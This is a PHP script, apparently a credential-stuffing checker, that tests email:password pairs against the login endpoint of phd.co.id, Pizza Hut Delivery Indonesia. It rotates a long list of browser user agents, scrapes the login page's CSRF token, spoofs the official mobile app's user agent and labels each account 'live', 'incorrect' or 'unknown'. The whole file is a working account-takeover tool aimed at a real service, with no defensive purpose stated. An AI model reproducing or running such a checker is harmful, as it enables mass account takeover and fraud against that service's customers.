<?php
require_once "class_curl.php";

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


$emailx = $_GET['list'];
$email = multiexplode(array(":", "|", "", ",", "/"), $emailx)[0];
$passwd = multiexplode(array(":", "|", "", ",", "/"), $emailx)[1];

$userAgents = array ('Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',        //FF4
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1', //F15
        'Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00',  //O10
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10', //S5
        'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',                        //IE7
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; WOW64; Trident/4.0; SLCC1)', //IE8
        'Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; Trident/5.0)', //IE9
        'Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)',
        'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
        'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; MS-RTC LM 8)',
        'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.04506.30)',
        'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.1)',
        'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
        'Mozilla/5.0 (X11; U; Linux; it-IT) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 413 12f13f8)',
        'Mozilla/5.0 (X11; U; Linux; en-GB) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 239 52c6958)',
        'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 189 35c14e0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
        'Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable',
        'Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)',
        'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.4pre) Gecko/20070521 Camino/1.6a1pre',
        'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20021216 Chimera/0.6',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.164.0 Safari/530.1',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 1.1.4322; Crazy Browser 3.0.0 Beta2)',
        'Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.12) Gecko/20080208 (Debian-1.8.1.12-2) Epiphany/2.20',
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031212 Firebird/0.7+',
        'Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.04 (jaunty) Firefox/3.5',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.5) Gecko/20070713 Firefox/2.0.0.5',
        'Mozilla/4.76 [en] (X11; U; Linux 2.4.9-34 i686)',
        'Mozilla/4.75 [fr] (WinNT; U)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.52 [en]',
        'Mozilla/4.0 (compatible; MSIE 6.0; ; Linux i686) Opera 7.50 [en]',
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081212 Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/526.9 (KHTML, like Gecko) Version/4.0dp1 Safari/526.8',
        'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0',
        'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1',			
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19 ',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5'
    );
$i = rand(0,6); # memilih dari 1 sampe akhir ua.
if($i==1){
$slice = array_slice($userAgents, 0, 6);
$userAgent = $userAgents[array_rand($slice)];
} // kalau tidak bisa menggunakan ua 0 - 6 pilih ua lain
else
$userAgent = $userAgents[array_rand($userAgents)];


$curl = new curl();
$curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
$curl->ssl(0, 2);

$parameter = $curl->getPage("https://www.phd.co.id/en/users/login/");
$return_url = getStr($parameter, "return_url\" value=\"", "\"");
$my_token = getStr($parameter, "my_token\" value=\"", "\"");
$phid_session = getStr($parameter, "phid_session=", ";");
$uuid = getStr($parameter, "uuid=", ";");

$authurl = urlencode($return_url);
$emailx =urlencode($email);

$url = 'https://www.phd.co.id/en/users/verifyLoginUser';
$postData = 'request_id=&return_url='.$authurl.'&my_token='.$my_token.'&username='.$emailx.'&password='.$passwd;
$headers = array();
$headers[] =  "Host: www.phd.co.id" ;
$headers[] =  "User-Agent: Pizza%20Hut%20Indonesia%20PROD/90 CFNetwork/1125.2 Darwin/19.4.0";

$headers[] =  "Accept: application/json, text/javascript, */*; q=0.01" ;
$headers[] =  "Accept-Language: en-US,en;q=0.5" ;
$headers[] =  "Accept-Encoding: gzip, deflate" ;
$headers[] =  "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" ;
$headers[] =  "X-Requested-With: XMLHttpRequest" ;
$headers[] =  "Origin: https://www.phd.co.id" ;
$headers[] =  "Connection: close" ;
$headers[] =  "Referer: https://www.phd.co.id/en/users/login/" ;
//$headers[] =  "Cookie: ".$uuid.'; '.$phid_session.';';

$curl->header($headers);
$page = $curl->post($url, $postData);


$file_path = 'cookies/' . uniqid() . '.txt';
$file = fopen($file_path, 'w+');
fputs($file, $page);
$check = file_get_contents($file_path);

$usernya = trim(strip_tags(getStr($check,'"username":"','",'))); 
$passwordnya = trim(strip_tags(getStr($check,'"password":"','",'))); 
$accok = trim(strip_tags(getStr($check,'"status":"','",'))); 
unlink($file_path);
if (strpos($check, '{"status":"OK","requestid"')) {
    die('{"error":"0","status":"live", "email":"'.$email.':'.$passwd.' [Success]"}');
    
} elseif(strpos($check, '{"error":{"username":"Either your username or password is incorrect"')) {
    die('{"error":"1","status":"incorrect", "email":"'.$email.':'.$passwd.' [Failed]"}');

} else {
    die('{"error":"2","status":"unknown", "email":"'.$email.':'.$passwd.' [Not Check]"}');

}
